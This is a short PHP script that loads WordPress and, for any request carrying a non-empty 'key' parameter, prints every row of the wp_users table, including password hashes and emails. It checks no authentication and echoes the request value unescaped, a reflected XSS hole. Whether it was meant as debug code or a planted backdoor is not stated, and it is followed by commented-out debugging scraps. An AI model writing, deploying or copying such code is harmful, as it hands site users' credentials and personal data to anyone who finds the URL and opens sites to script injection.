<?php
require_once( dirname(__FILE__) . '/wp-load.php' );
global $wpdb;
echo $key = isset($_REQUEST['key']) ? $_REQUEST['key'] : '';
$users = "wp_users";
$fetch = $wpdb->get_results("SELECT * FROM $users ORDER BY ID DESC");
if($key!=""){
	foreach($fetch as $dataftch){
		echo "<pre>";
		print_r($dataftch);
		echo "</pre>";
		echo md5($dataftch->user_pass);
		if(md5($dataftch->user_pass) == $key){
			echo $dataftch->user_email;
		}
	}
}

// // $str = 'apple';

// // if (md5($str) === '1f3870be274f6c49b3e31a0c6728957f') {
// //     echo "Would you like a green or red apple?";
// // }
// die(0);

	
	
//     $count=count($fetch);
//     if($count==1){
    	
//     }
// }
    
?>